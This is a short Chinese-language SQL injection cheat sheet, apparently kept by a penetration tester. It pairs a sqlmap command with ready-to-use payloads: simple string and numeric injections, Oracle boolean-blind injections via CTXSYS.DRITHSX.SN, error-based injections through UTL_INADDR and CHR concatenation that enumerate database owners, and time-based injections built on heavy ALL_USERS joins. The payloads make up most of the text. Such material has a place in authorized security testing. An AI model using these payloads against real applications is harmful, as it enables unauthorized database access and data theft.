## SQL注入

测试注重积累POC，通过插件自动化

### 1.sqlmap

对于找到的疑似参数，建议通过sqlmap指定参数进行自动化扫描：  

sqlmap.py -r request.txt -p "param1,param2" --proxy="http://127.0.0.1:8089" --dbs  

### 2.简单字符注入
select语句的注入，有时需要猜准第一个参数的值，例如此处的用户名admin   

	admin' AND 'XXX'='XXX 
	
	
### 3.简单数字注入 
	admin' AND 1=1   
	admin' AND 1=2

### 4.Oracle 布尔类型盲注
CTXSYS.drithsx.sn 和 CTXSYS.CTX_REPORT.TOKEN_TYPE 是 Oracle 中自带的函数，用于处理文本，当传入参数类型错误时，会返回异常:常用的 payload: ' and 1=ctxsys.drithsx.sn(1,(select user from dual))--  


	admin' AND (SELECT(CASE WHEN(7118=7118）THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7118) END) FROM DUAL) IS NULL AND 'XBBR'='XBBR

	admin' AND (SELECT(CASE WHEN(7118=7118）THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7118) END) FROM DUAL) IS NULL
	
### 5.Oracle 基于错误的注入
基于错误的注入，是利用SQL语句执行的错误，识别回显的差异。  
CTXSYS.drithsx.sn(1, (query))  
CTXSYS.CTX_REPORT.TOKEN_TYPE('', (query))  
UTL_INADDR.get_host_name(query)   
UTL_INADDR.get_host_address(query)  
Oracle 中使用 || 连接字符串。

	回显：KkjzK+查询内容+KkjzK 
	admin' AND 1297=CTXSYS.DRITHSX.SN(1297,(CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1297=1297) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113))) AND 'JOqN'='JOqN  
	
获取数据库的数量：  
SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES

获取每一个数据库的名称：  
' AND 7093=CTXSYS.DRITHSX.SN(7093,CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(select OWNER from (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES) order by 1 ASC ) WHERE LIMIT=21)||CHR(113)||CHR(120)||CHR(118)||CHR(122)||CHR(113)) AND 'XlYj'='XlYj

	
### 6.Oracle 基于时间的注入
基于AND/OR的时间注入：  

	admin' AND 9102=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'DBEp'='DBEp  
	admin' OR 9102=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'DBEp'='DBEp



link:  
[Oracle手注](https://blog.csdn.net/niexinming/article/details/48985873?utm_source=blogkpcl14)  
[i春秋SQL注入](https://bbs.ichunqiu.com/thread-41701-1-1.html?from=bkyl)


	

  

	
	

